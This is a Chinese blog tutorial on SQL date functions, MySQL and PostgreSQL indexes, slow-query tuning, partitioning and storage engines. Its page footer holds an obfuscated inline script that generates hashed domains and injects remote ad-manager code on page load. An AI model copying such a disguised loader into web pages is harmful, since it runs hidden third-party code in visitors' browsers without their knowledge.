</code></pre> 
<p><strong>MySQL和Postgresql数据库没有decode函数，可用CASE表达式替代。</strong></p> 
<br> 
<h4><a id="_453"></a>日期函数</h4> 
<pre><code class="prism language-sql"><span class="token comment">-- 获取系统当前时间</span>
sysdate
<span class="token comment">-- 实例</span>
<span class="token keyword">select</span> sysdate <span class="token keyword">from</span> dual<span class="token punctuation">;</span>

<span class="token comment">-- 获取系统当前时间并格式化为字符串</span>
to_char<span class="token punctuation">(</span>sysdate<span class="token punctuation">,</span><span class="token string">'yyyy-MM-dd HH24:mi:ss'</span><span class="token punctuation">)</span>

<span class="token comment">-- 把字符串解析成时间</span>
to_date<span class="token punctuation">(</span><span class="token string">'2015-08-12 15:53:37'</span><span class="token punctuation">,</span><span class="token string">'yyyy-MM-dd HH24:mi:ss)

-- 当前时间减去7分钟
select sysdate - interval '</span><span class="token number">7</span><span class="token string">' minute from dual
-- 表示当前时间减去7小时
select sysdate - interval '</span><span class="token number">7</span><span class="token string">' hour from dual
-- 表示当前时间减去7年
select sysdate - interval '</span><span class="token number">7</span>' <span class="token keyword">year</span> <span class="token keyword">from</span> dual 
</code></pre> 
<pre><code class="prism language-sql"><span class="token comment">-- 时间转换中字符的意义 </span>
表示<span class="token keyword">year</span>的：
y 		表示年的最后一位
yy 		表示年的最后<span class="token number">2</span>位
yyy 	表示年的最后<span class="token number">3</span>位
yyyy 	用<span class="token number">4</span>位数表示年

表示<span class="token keyword">month</span>的：
mm 		用<span class="token number">2</span>位数字表示月 
mon 	用简写形式， 比如：<span class="token number">11</span>月 或者 nov 
<span class="token keyword">month</span> 	用全称， 比如：<span class="token number">11</span>月 或者 november

表示<span class="token keyword">day</span>的：
dd 		表示当月第几天
ddd 	表示当年第几天
dy 		当周第几天，简写， 比如：星期五 或者 fri
<span class="token keyword">day</span> 	当周第几天，全称， 比如：星期五 或者 friday

表示<span class="token keyword">hour</span>的：
hh HH HH12	表示小时 <span class="token number">12</span>进制
hh24 HH24 	表示小时 <span class="token number">24</span>小时

表示<span class="token keyword">minute</span>的：
mi 		<span class="token number">2</span>位数表示分钟

表示<span class="token keyword">second</span>的：
ss 		<span class="token number">2</span>位数表示秒 <span class="token number">60</span>进制

表示季度的：
q 		<span class="token number">1</span>位数表示季度 <span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>

表示周的：
w		表示当月月的第几周
ww 		用来表示当年第几周 w用来表示当月第几周。
</code></pre> 
<br> 
<h3><a id="Postgresql_514"></a>Postgresql数据库</h3> 
<h4><a id="_516"></a>日期函数</h4> 
<pre><code class="prism language-sql"><span class="token comment">-- 返回当前实际的时间，即使在同一个 SQL 语句中也可能返回不同的值</span>
clock_timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">-- 获取当前事务开始的完整时间，包括时区，秒也保留到了6位小数。在同一个事务期间，多次调用相同的函数将会返回相同的值</span>
<span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">current_timestamp</span>
transaction_timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">-- 实例。得到的结果：'2014-12-24 09:28:31.545145+08'</span>
<span class="token keyword">select</span> <span class="token function">now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- 只显示当前的时间，不包括日期</span>
<span class="token keyword">current_time</span> 
<span class="token comment">-- 实例</span>
<span class="token keyword">select</span> <span class="token keyword">current_time</span><span class="token punctuation">;</span>

<span class="token comment">-- 只显示当前的日期，不包括小时等信息</span>
<span class="token keyword">current_date</span>
<span class="token comment">-- 实例    </span>
<span class="token keyword">select</span> <span class="token keyword">current_date</span><span class="token punctuation">;</span>

<span class="token comment">-- 获取系统当前时间戳并格式化为字符串</span>
to_char<span class="token punctuation">(</span>clock_timestamp<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'yyyy-MM-dd HH24:mi:ss'</span><span class="token punctuation">)</span>
 
<span class="token comment">-- 把时间戳转换成字符串</span>
to_timestamp<span class="token punctuation">(</span><span class="token string">'2014-12-24 09:28:31'</span><span class="token punctuation">,</span> <span class="token string">'yyyy-MM-dd HH24:mi:ss'</span><span class="token punctuation">)</span>
</code></pre> 
<br> 
<h2><a id="_548"></a>索引</h2> 
<p>将数据进行排序整理的过程就称为索引。根据索引去查，提高查询效率，减少耗时时间。</p> 
<p><strong>索引</strong>是帮助数据库高效获取<strong>排好序</strong>的<strong>数据结构</strong></p> 
<h3><a id="_554"></a>索引的分类、优缺点、创建原则</h3> 
<p><strong>索引的分类</strong></p> 
<ul><li> <p>主键（约束）索引（约束 + 索引）</p> <p>主键就是一个索引，在索引的基础上具有约束（非空和唯一）行为</p> <p>主键约束 + 提高查询效率</p> </li><li> <p>唯一（约束）索引</p> <p>唯一约束 + 提高查询效率</p> </li><li> <p>普通索引</p> <p>仅提高查询效率</p> </li><li> <p>组合（联合）索引</p> <p>多个字段组成索引提高查询效率</p> </li></ul> 
<br> 
<p><strong>索引的优缺点</strong></p> 
<ul><li> <p>优点：提高查询效率</p> </li><li> <p>缺点：索引占用磁盘空间</p> <p>添加记录、更新、修改时，也会更新索引，会间接影响数据库的效率。</p> </li></ul> 
<br> 
<p><strong>索引的创建原则</strong></p> 
<ol><li> <p>经常使用where条件搜索的字段</p> </li><li> <p>经常使用表连接的字段（内连接、外连接） 外键</p> </li><li> <p>经常排序的字段 order by</p> </li></ol> 
<p>注意：索引本身会占用磁盘空间，不是所有的字段都适合增加索引</p> 
<br> 
<h3><a id="_600"></a>常见索引失效情况</h3> 
<ol><li> <p>没有查询条件，或者查询条件没有建立索引</p> </li><li> <p>like查询以%开头</p> </li><li> <p>where子句使用or时，只要条件有一个没有索引，那么都会进行全表扫描</p> <p>要想使用or，又想让索引生效，只能将or条件中的每个列都加上索引</p> </li><li> <p>where子句在索引列上进行运算或使用函数</p> </li><li> <p>where子句使用 !=、&lt;，&gt;操作符或 not in、is not null判断时</p> </li><li> <p>where子句使用字符串时没有使用单引号，导致数据类型隐形转换</p> </li><li> <p>使用复合索引作为条件时，单独引用复合索引里非第一位置的索引列</p> </li></ol> 
<br> 
<h3><a id="_620"></a>索引的数据结构</h3> 
<p><strong>B+树</strong> 由B树演变而来，将所有的数据都存储在了叶子节点中，非叶子节点值存放索引加指针</p> 
<p><img src="https://images2.imgbox.com/6e/f2/AUXEA94i_o.png" alt="在这里插入图片描述"></p> 
<br> 
<h3><a id="MySQL_629"></a>MySQL索引语法</h3> 
<h4><a id="_631"></a>创建索引</h4> 
<h5><a id="__633"></a>① 创建表时指定【常用】</h5> 
<pre><code class="prism language-sql"><span class="token comment">-- 创建教师表</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> teacher<span class="token punctuation">(</span>
    id <span class="token keyword">INT</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span> <span class="token comment">-- 主键索引</span>
    name <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    email <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span> <span class="token keyword">UNIQUE</span><span class="token punctuation">,</span> <span class="token comment">-- 唯一索引</span>
    sex <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    birthday <span class="token keyword">DATE</span><span class="token punctuation">,</span>
    <span class="token keyword">INDEX</span><span class="token punctuation">(</span><span class="token punctuation">`</span>name<span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token comment">-- 普通索引</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h5><a id="__647"></a>② 直接创建</h5> 
<pre><code class="prism language-sql"><span class="token comment">-- 创建普通索引</span>
<span class="token keyword">create</span> <span class="token keyword">index</span> 索引名 <span class="token keyword">on</span> 表名<span class="token punctuation">(</span>字段<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- 创建唯一索引</span>
<span class="token keyword">create</span> <span class="token keyword">unique</span> <span class="token keyword">index</span> 索引名 <span class="token keyword">on</span> 表名<span class="token punctuation">(</span>字段<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- 创建普通联合索引</span>
<span class="token keyword">create</span> <span class="token keyword">index</span> 索引名 <span class="token keyword">on</span> 表名<span class="token punctuation">(</span>字段<span class="token number">1</span><span class="token punctuation">,</span>字段<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- 创建唯一联合索引</span>
<span class="token keyword">create</span> <span class="token keyword">unique</span> <span class="token keyword">index</span> 索引名 <span class="token keyword">on</span> 表名<span class="token punctuation">(</span>字段<span class="token number">1</span><span class="token punctuation">,</span>字段<span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<pre><code class="prism language-sql"><span class="token comment">-- 创建学生表</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> student<span class="token punctuation">(</span>
 id <span class="token keyword">INT</span><span class="token punctuation">,</span>
 name <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
 email <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- name字段设置普通索引</span>
<span class="token keyword">CREATE</span> <span class="token keyword">INDEX</span> name_idx <span class="token keyword">ON</span> student<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">-- email字段设置唯一索引</span>
<span class="token keyword">CREATE</span> <span class="token keyword">UNIQUE</span> <span class="token keyword">INDEX</span> telephone_uni_idx <span class="token keyword">ON</span> student<span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h5><a id="__678"></a>③ 修改表时指定</h5> 
<pre><code class="prism language-sql"><span class="token comment">-- 添加一个主键，这意味着索引值必须是唯一的，且不能为NULL</span>
<span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 <span class="token keyword">add</span> <span class="token keyword">primary</span> <span class="token keyword">key</span><span class="token punctuation">(</span>字段<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">-- 默认的索引名叫：primary</span>

<span class="token comment">-- 添加唯一索引（除了NULL外，NULL可以出现多次）</span>
<span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 <span class="token keyword">add</span> <span class="token keyword">unique</span><span class="token punctuation">(</span>字段<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">-- 默认的索引名叫：字段名</span>

<span class="token comment">-- 添加普通索引</span>
<span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 <span class="token keyword">add</span> <span class="token keyword">index</span><span class="token punctuation">(</span>字段<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">-- 默认的索引名叫：字段名</span>
</code></pre> 
<pre><code class="prism language-sql"><span class="token comment">-- 指定id为主键索引</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> student <span class="token keyword">ADD</span> <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 指定name为普通索引</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> student <span class="token keyword">ADD</span> <span class="token keyword">INDEX</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">-- 指定email为唯一索引</span>
<span class="token keyword">ALTER</span> <span class="token keyword">TABLE</span> student <span class="token keyword">ADD</span> <span class="token keyword">UNIQUE</span><span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<br> 
<h4><a id="_702"></a>删除索引</h4> 
<pre><code class="prism language-sql"><span class="token comment">-- 直接删除</span>
<span class="token keyword">drop</span> <span class="token keyword">index</span> 索引名 <span class="token keyword">on</span> 表名<span class="token punctuation">;</span>

<span class="token comment">-- 修改表时删除</span>
<span class="token keyword">alter</span> <span class="token keyword">table</span> 表名 <span class="token keyword">drop</span> <span class="token keyword">index</span> 索引名<span class="token punctuation">;</span>
</code></pre> 
<br> 
<h2><a id="_714"></a>数据库性能调优</h2> 
<h3><a id="MySQL_716"></a>MySQL性能调优</h3> 
<h4><a id="_718"></a>查询耗时语句</h4> 
<p><strong>查看数据库的累计操作</strong></p> 
<pre><code class="prism language-sql"><span class="token comment">-- 查询累计操作数据影响次数</span>
<span class="token keyword">show</span> <span class="token keyword">global</span> <span class="token keyword">status</span> <span class="token operator">like</span> <span class="token string">'Innodb_rows%'</span><span class="token punctuation">;</span>

<span class="token comment">-- 结果：</span>
Innodb_rows_deleted		<span class="token number">0</span>
Innodb_rows_inserted	<span class="token number">611</span>
Innodb_rows_read		<span class="token number">857</span>
Innodb_rows_updated		<span class="token number">0</span>
</code></pre> 
<br> 
<p>数据库自带日志记录：<strong>慢查询日志</strong></p> 
<p>作用：记录查询耗时语句</p> 
<pre><code class="prism language-sql"><span class="token comment">-- 查看慢查询日志开启情况。默认慢查询是关闭的</span>
<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow_query_log%'</span><span class="token punctuation">;</span>    

<span class="token comment">-- 查看慢查询时间配置。默认10秒耗时临界点会记录</span>
<span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%long_query_time%'</span><span class="token punctuation">;</span>
</code></pre> 
<p><strong>开启慢查询日志</strong></p> 
<pre><code class="prism language-sql"><span class="token keyword">set</span> <span class="token keyword">global</span> slow_query_log <span class="token operator">=</span> <span class="token keyword">on</span><span class="token punctuation">;</span>
</code></pre> 
<p><strong>设置慢查询sql的时间阈值</strong></p> 
<pre><code class="prism language-sql"><span class="token comment">-- 全局配置（下次生效...）</span>
<span class="token keyword">set</span> <span class="token keyword">global</span> long_query_time<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>
<span class="token comment">-- 立即生效</span>
<span class="token keyword">set</span> <span class="token keyword">session</span> long_query_time<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/c7/94/UBOZ0Q34_o.png" alt="在这里插入图片描述"></p> 
<br> 
<h4><a id="_767"></a>优化方案</h4> 
<p>由自带的<strong>慢查询日志</strong>或者开源的慢查询系统定位到具体出问题的 SQL，然后使用<strong>explain</strong>等工具来逐步调优，最后经过测试达到效果后上线。</p> 
<ol><li> <p><strong>索引的优化</strong>， 建立索引，并避免索引失效的情况</p> </li><li> <p><strong>SQL 语句的优化</strong></p> </li><li> <p><strong>表的优化</strong>，分表 水平分割（按行） 垂直分割(按列)</p> </li></ol> 
<br> 
<p><strong>索引的优化</strong></p> 
<ol><li> <p>尽量使用短索引</p> </li><li> <p>经常在where子句使用的列，最好设置索引</p> </li><li> <p>有多个列where或者order by子句的，应该建立复合索引</p> </li><li> <p>只要列中含有NULL值，就最好不要在此列设置索引，复合索引如果有NULL值，此列在使用时也不会使用索引</p> </li><li> <p>尽量避免索引失效的情况</p> </li></ol> 
<br> 
<p><strong>SQL 语句优化</strong></p> 
<ol><li> <p>应指定查询需要的字段，避免查询表中的所有字段（即避免使用 select * from table）</p> </li><li> <p>大部分情况，连接查询效率远大于子查询，除非子查询效率确实大于连接查询的特殊情况，否则尽量使用连接查询</p> </li><li> <p>多表连接查询时，尽量小表驱动大表，即小表 join 大表</p> </li></ol> 
<br> 
<p><strong>表的优化</strong></p> 
<ol><li> <p>表的字段尽可能用NOT NULL限制</p> </li><li> <p>字段长度固定的表查询会更快</p> </li><li> <p>将大表分成小表；按时间或一些标志，水平分割（按行）、垂直分割(按列)</p> </li></ol> 
<br> 
<h3><a id="MySQL_813"></a>MySQL的分区及读写分离</h3> 
<p>mysql 的<strong>分表</strong>是一张表分成很多表后，每一个小表都是完整的一张表，都对应三个文件，一个数据文件，一个索引文件，一个表结构文件。分表后，单表的并发能力提高了，磁盘 I/O 性能也提高了。</p> 
<p>mysql的<strong>分区</strong>是一张大表进行分区后，他还是一张表，将数据分段划分在多个位置存放，可以是同一块磁盘也可以在不同的机器。</p> 
<p><strong>mysql分表和分区的联系</strong>：都能提高mysql的性能，在高并发状态下都有一个良好的表现。</p> 
<br> 
<p><strong>读写分离</strong>：实际的应用中，绝大部分情况都是读远大于写。所有的写操作都必须对应到 Master，读操作可以在 Master 和 Slave<br> 机器上进行，Slave 与 Master 的结构完全一样，一个 Master 可以有多个Slave，所有的写操作都是先在 Master 上操作，然后同步更新到 Slave上。可以有效的提高 DB 集群的每秒查询率。</p> 
<p>当读压力很大的时候，可以考虑添加 Slave 机器的方式解决，但是当 Slave机器达到一定的数量就得考虑分库了。当写压力很大的时候，就必须得进行分库操作。</p> 
<br> 
<h3><a id="MySQL_830"></a>MySQL数据库的存储引擎</h3> 
<p>将B+Tree的数据结构保存到物理磁盘：根据数据库的存储引擎来决定的</p> 
<p>MySQL存储引擎的不同，那么索引文件保存的方式也有所不同，常见的有二种存储引擎<strong>MyISAM</strong>和<strong>InnoDB</strong>。</p> 
<p>MySQL 5.5 及更高版本，默认的存储引擎是 <strong>InnoDB</strong>。在 5.5 版本之前，MySQL 的默认存储引擎是 MyISAM。</p> 
<ul><li> <p><strong>InnoDB</strong> 存储引擎（<strong>聚集索引</strong>–索引和数据是在一起的）</p> <p>特点：行锁设计、<strong>支持事务、支持外键</strong>、支持非锁定读</p> <p>使用 next-key-locking 的策略避免幻读现象</p> <p>提供插入缓冲、二次写、自适应哈希索引、预读</p> <p>采用聚集的方式存储表中数据</p> </li><li> <p><strong>MyISAM</strong> 存储引擎（<strong>非聚集索引</strong>–索引和数据是分离的）</p> <p>不支持事务、表锁设计，支持全文搜索</p> <p>缓冲池只缓存索引文件，不缓存数据文件</p> <p>MyISAM 存储引擎表由 MYD（存放数据文件）和 MYI（存放索引文件）组成。</p> </li></ul>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/6b64b126fe142c9fbd761d035df63133/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">oss大文件网页上传</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/12901bf55c0e06570ff9acc641b21cbb/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">云计算技术基础【5】</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>